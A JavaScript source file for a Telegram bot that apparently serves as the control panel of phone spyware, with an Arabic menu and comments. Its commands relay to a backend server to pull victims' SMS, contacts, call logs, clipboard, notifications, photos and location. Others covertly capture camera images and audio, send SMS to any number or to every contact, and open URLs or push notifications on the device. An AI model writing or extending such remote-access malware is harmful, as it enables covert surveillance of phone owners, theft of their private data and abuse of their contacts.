const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const config = require('./config');

class TelegramControlBot {
    constructor() {
        this.bot = new TelegramBot(config.TELEGRAM.TOKEN, { polling: true });
        this.serverUrl = `http://localhost:${config.SERVER.PORT}`;
        this.setupBot();
    }

    setupBot() {
        console.log('🚀 بوت التلجرام يعمل...');

        // ✅ التحقق من الهوية
        this.bot.on('message', (msg) => {
            if (msg.chat.id.toString() !== config.TELEGRAM.CHAT_ID) {
                this.bot.sendMessage(msg.chat.id, '❌ غير مصرح بالدخول');
                return;
            }
        });

        // 🎯 الأمر الرئيسي
        this.bot.onText(/\/start/, (msg) => {
            this.showMainMenu(msg.chat.id);
        });

        // 🔦 الميزات الأساسية
        this.bot.onText(/\/flashlight_(on|off)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'flashlight', { state: match[1] === 'on' });
        });

        this.bot.onText(/\/vibrate/, (msg) => {
            this.sendCommand(msg.chat.id, 'vibrate', { duration: 1000 });
        });

        this.bot.onText(/\/toast (.+)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'toast', { message: match[1] });
        });

        this.bot.onText(/\/play_sound (.+)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'play_sound', { url: match[1] });
        });

        // 📱 معلومات الجهاز
        this.bot.onText(/\/device_info/, (msg) => {
            this.sendCommand(msg.chat.id, 'device_info');
        });

        this.bot.onText(/\/get_clipboard/, (msg) => {
            this.sendCommand(msg.chat.id, 'get_clipboard');
        });

        // ✉️ الرسائل
        this.bot.onText(/\/get_sms/, (msg) => {
            this.sendCommand(msg.chat.id, 'get_sms');
        });

        this.bot.onText(/\/send_sms (.+) (.+)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'send_sms', { 
                number: match[1], 
                message: match[2] 
            });
        });

        this.bot.onText(/\/send_sms_to_all (.+)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'send_sms_to_all', { 
                message: match[1] 
            });
        });

        // 👥 جهات الاتصال
        this.bot.onText(/\/get_contacts/, (msg) => {
            this.sendCommand(msg.chat.id, 'get_contacts');
        });

        this.bot.onText(/\/get_call_logs/, (msg) => {
            this.sendCommand(msg.chat.id, 'get_call_logs');
        });

        // 📷 الوسائط
        this.bot.onText(/\/camera_(front|back)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'camera_capture', { 
                camera_type: match[1] 
            });
        });

        this.bot.onText(/\/record_audio (.+)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'record_audio', { 
                duration: parseInt(match[1]) 
            });
        });

        this.bot.onText(/\/get_gallery/, (msg) => {
            this.sendCommand(msg.chat.id, 'get_gallery');
        });

        // 📍 الموقع والإشعارات
        this.bot.onText(/\/get_location/, (msg) => {
            this.sendCommand(msg.chat.id, 'get_location');
        });

        this.bot.onText(/\/get_notifications/, (msg) => {
            this.sendCommand(msg.chat.id, 'get_notifications');
        });

        this.bot.onText(/\/send_notification (.+) (.+)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'send_notification', { 
                title: match[1], 
                message: match[2] 
            });
        });

        // 🌐 المتصفح
        this.bot.onText(/\/open_url (.+)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'open_url', { 
                url: match[1] 
            });
        });

        // 📋 الخلفية
        this.bot.onText(/\/change_wallpaper/, (msg) => {
            this.sendCommand(msg.chat.id, 'change_wallpaper');
        });
    }

    async sendCommand(chatId, command, parameters = {}) {
        try {
            this.bot.sendMessage(chatId, `🔄 جاري تنفيذ: ${command}...`);

            const response = await axios.post(`${this.serverUrl}/api/command`, {
                command: command,
                parameters: parameters,
                timestamp: Date.now()
            });

            if (response.data.status === 'success') {
                this.bot.sendMessage(chatId, `✅ تم تنفيذ: ${command}`);
            } else {
                this.bot.sendMessage(chatId, `❌ فشل: ${response.data.message}`);
            }

        } catch (error) {
            this.bot.sendMessage(chatId, `❌ خطأ في الاتصال: ${error.message}`);
        }
    }

    showMainMenu(chatId) {
        const menu = `
🎯 *نظام التحكم في الهواتف عبر التلجرام*

🔦 *الميزات الأساسية:*
/flashlight_on - تشغيل الشعلة
/flashlight_off - إيقاف الشعلة  
/vibrate - اهتزاز الجهاز
/toast [نص] - عرض رسالة توست
/play_sound [رابط] - تشغيل صوت
/device_info - معلومات الجهاز
/get_clipboard - نص الحافظة
/change_wallpaper - تغيير الخلفية

✉️ *الرسائل والاتصالات:*
/get_sms - استقبال الرسائل
/send_sms [رقم] [رسالة] - إرسال رسالة
/send_sms_to_all [رسالة] - إرسال للجميع
/get_contacts - جهات الاتصال
/get_call_logs - سجلات المكالمات
/get_notifications - الإشعارات

📷 *الوسائط:*
/camera_front - كاميرا أمامية
/camera_back - كاميرا خلفية
/record_audio [ثواني] - تسجيل صوت
/get_gallery - معرض الصور

📍 *أخرى:*
/get_location - موقع الجهاز
/open_url [رابط] - فتح رابط
/send_notification [عنوان] [رسالة] - إرسال إشعار

💡 *طريقة الاستخدام:*
أرسل الأمر مباشرة مثل:
/toast مرحبا بالعالم
/send_sms 1234567890 Hello
        `;

        this.bot.sendMessage(chatId, menu, { parse_mode: 'Markdown' });
    }
}

// تشغيل البوت
new TelegramControlBot();
